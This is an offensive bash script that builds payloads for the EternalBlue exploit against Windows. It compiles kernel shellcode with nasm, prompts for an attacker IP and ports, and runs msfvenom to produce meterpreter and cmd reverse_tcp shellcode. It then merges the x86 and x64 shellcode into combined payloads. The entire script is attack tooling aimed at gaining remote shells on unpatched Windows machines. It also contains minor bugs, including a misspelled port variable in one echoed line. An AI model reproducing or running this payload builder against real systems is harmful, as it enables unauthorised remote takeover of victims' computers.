cat << "EOF"
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
      S6r.'-..-'|_.-''-._|   
EOF
echo Eternal Blue Windows Shellcode Compiler
echo
echo Let\'s compile them windoos shellcodezzz
echo
echo Compiling x64_meterpreter kernel shellcode
nasm -f bin eternalblue_kshellcode_x64_meterpreter.asm -o sc_x64_meterpreter_kernel.bin
echo 'Compiling x86_meterpreter kernel shellcode'
nasm -f bin eternalblue_kshellcode_x86_meterpreter.asm -o sc_x86_meterpreter_kernel.bin
echo 'Compiling x64_shell kernel shellcode'
nasm -f bin eternalblue_kshellcode_x64_shell.asm -o sc_x64_shell_kernel.bin
echo 'Compiling x86_shell kernel shellcode'
nasm -f bin eternalblue_kshellcode_x86_shell.asm -o sc_x86_shell_kernel.bin
echo kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? \(Y\/n\)
read genMSF
if [[ $genMSF =~ [yY](es)* ]]
then
    echo IP for reverse connection:
    read ip
    echo PORT meterpreter you want x64 to listen on:
    read portOne
    echo PORT meterpreter you want x86 to listen on:
    read portTwo
    echo PORT shell you want x64 to listen on:
    read portThree
    echo PORT shell you want x86 to listen on:
    read portFour
    echo Enter 0 for meterpreter shell or 1 for regular cmd shell or 2 meterpreter and shell
    read cmd
    if [[ $cmd -eq 0 ]]
    then
        echo Generating x64 meterpreter shell...
        echo
	echo msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
	msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
        echo 
        echo Generating x86 meterpreter shell...
        echo
	echo msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
	msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
    elif [[ $cmd -eq 1 ]]
    then
        echo Generating x64 cmd shell...
        echo
        echo msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
        msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
        echo
        echo Generating x86 cmd shell...
        echo
        echo msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
        msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
    elif [[ $cmd -eq 2 ]]
    then
        echo Generating x64 meterpreter shell...
        echo
	echo msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_meterpreter_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
	msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_meterpreter_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
        echo 
        echo Generating x86 meterpreter shell...
        echo
	echo msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_meterpreter_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
	msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_meterpreter_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
        echo Generating x64 cmd shell...
        echo
        echo msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_shell_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$porThree
        msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_shell_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portThree
        echo
        echo Generating x86 cmd shell...
        echo
        echo msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_shell_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portFour
        msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_shell_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portFour
    else
        echo Invalid option...exiting...
    fi
echo
echo MERGING SHELLCODE WOOOO!!!
cat sc_x64_meterpreter_kernel.bin sc_x64_meterpreter_msf.bin > sc_x64_meterpreter.bin
cat sc_x86_meterpreter_kernel.bin sc_x86_meterpreter_msf.bin > sc_x86_meterpreter.bin
cat sc_x64_shell_kernel.bin sc_x64_shell_msf.bin > sc_x64_shell.bin
cat sc_x86_shell_kernel.bin sc_x86_shell_msf.bin > sc_x86_shell.bin
python eternalblue_sc_merge.py sc_x86_meterpreter_msf.bin sc_x64_meterpreter_msf.bin sc_all_mpr.bin
python eternalblue_sc_merge.py sc_x86_shell_msf.bin sc_x64_shell_msf.bin sc_all_shl.bin
else
    echo Okay cool, make sure you merge your own shellcode properly :\)
fi
echo DONE
